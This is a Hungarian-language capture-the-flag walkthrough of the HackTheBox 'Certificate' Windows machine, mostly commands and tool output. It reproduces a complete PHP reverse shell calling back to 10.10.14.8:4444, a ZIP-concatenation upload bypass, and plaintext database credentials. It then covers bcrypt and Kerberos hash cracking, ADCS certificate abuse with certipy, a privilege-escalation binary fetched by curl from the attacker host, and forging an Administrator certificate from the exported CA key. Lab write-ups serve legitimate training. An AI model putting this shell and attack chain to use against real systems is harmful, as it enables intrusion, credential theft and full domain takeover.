
# HTB Certificate - Writeup (magyar)

> 🚨 **Kövess élőben HTB-n — leakek, dropok és mély writeupok**  
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)  
> _Ne olvasd. Csatlakozz._

**Platform:** Windows  
**IP:** 10.10.11.71  
**Difficulty:** Hard  
**Author:** NoSec

---

## Recon / Felderítés

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```
### Clock-skew

- Időszinkron kell Kerberoshoz!
  ```bash
  sudo rdate -n certificate.htb
  ```

## Webes rész – RCE feltöltéssel

Regisztrálhatsz az oldalon, majd egy tetszőleges kurzusnál az Enroll gombra kattintva kapsz egy ilyen URL-t:

```
http://certificate.htb/upload.php?s_id=36
```

Kizárólag PDF és ZIP fájlt enged feltölteni!  
ZIP concatenation trükköt használtam, hogy végül csak a PHP shell kerüljön a végére (érvényes ZIP struktúrával).

### Lépések

1. Készítsd el a reverse shellt (`shell.php`)

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.8';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; powershell -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```
2. Csinálj egy üres PDF-et (pl. `test.pdf`)
3. ZIP-ek összefűzése:

```bash
zip head.zip test.pdf
zip -r tail.zip nosechere   # nosechere/shell.php
cat head.zip tail.zip > main.zip
```

4. Töltsd fel a `main.zip`-et
5. Tallózd a shellt:

```
http://certificate.htb/static/uploads/[...]/nosechere/shell.php
```

6. Netcattel figyelj:

```bash
nc -lvnp 4444
```

Shell elérés: `xamppuser`

## Lábnyomozás: Adatbázis elérés

Futtatás:

```cmd
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"  -E
```

Kiemelt user:

- username: `sara.b`
- bcrypt hash: `$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6`

### Hash törése

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Jelszó: `Bl******`**

### WinRM hozzáférés

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Bl******'

```
> **Fontos!**  
> A HTB 2025. június 10-én patchelte a jelszóváltoztatási lehetőséget lion.sk felett, ezért mást utat kell választani!

## PCAP elemzés – Kerberos hash

- `WS-01_PktMon.pcap` (Kerberos forgalom)
- A PCAP fájlban egy TGS-REQ látható. Ez használható Kerberoastinghoz, ha a szolgáltatás SPN-nel van regisztrálva. A Krb5RoastParser direkt AS-REQ vagy TGS-REQ hash-t szed ki.
- `Krb5RoastParser` használat:
>  https://github.com/jalvarezz13/Krb5RoastParser

```bash
python krb5_roast_parser.py WS-01_PktMon.pcap as_req >> hash.txt
```

### Hashcat törés

```bash
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Jelszó: `!QA*****`**


---

## Certipy – PFX szerzés

### Lion.SK

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saved certificate and private key to 'lion.sk.pfx'
```

### Ryan.K

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saved certificate and private key to 'ryan.k.pfx'
```

### NTLM hash kinyerése

```bash
certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: ryan.k@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eea<hash>
```

### WinRM:

```bash
evil-winrm -i 10.10.11.71 -u ryan.k -H [ryan.k_hash]
```

## Privilege escalation

Jogosultság ellenőrzése:

```powershell
whoami /priv
```

**Kiemelt: `SeManageVolumePrivilege`**

### Exploit letöltése/futtatása

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public / SeaManageVolumeExploit.exe letöltése

```bash
curl 10.10.14.8/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
```

### Teszt:

```powershell
echo "test" > C:\Windows\test.txt
type C:\Windows\test.txt
```

## Certificate Authority tanúsítvány export

```powershell
mkdir /temp
certutil -exportPFX my "Certificate-LTD-CA" C:\temp\ca.pfx
```

Letöltés:

```
download ca.pfx
```

## Admin tanúsítvány hamisítása
A hamisított tanúsítvány segítségével hitelesítjük magunkat az AD felé, mintha az Administrator lennénk – ezáltal teljes TGT-t kapunk, amivel NTLM hash is lekérhető.

```bash
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved forged certificate and private key to 'forged_admin.pfx'
```

## Admin NTLM hash szerzése

```bash
certipy auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad<hash>
```

## Root / Administrator

```bash
(noname㉿Noname)-[~]
└─$ evil-winrm -i 10.10.11.71 -u administrator -H d80430<hash>
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> dir


    Directory: C:\Users\Lion.SK\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/17/2025  10:18 PM             34 user.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/17/2025  10:18 PM             34 root.txt


```

---

## Jegyzetek & Magyarázat

**Mit tanultam ebből a gépből?**

- Modern Active Directory támadási lánc
- ZIP concat trükk
- ADCS/PKI abuse
- Kerberos roast (PCAP-ból)
- Shadow Credentials / Priv. Esc.
- Cert forge via CA access

**Hibák, csapdák, tanácsok**

- Időszinkron kötelező!
- HTB patchelte 2025.06.10-én a jelszóváltoztatást

## Összegzés

A Certificate gép egy kiváló ADCS kompromittációs gyakorló.   
Ajánlott mindenkinek, aki modern AD / Red Teaming / Blue Teaming / PKI támadásokkal akar ismerkedni.
Bármi kérdésed van, keress bizalommal.
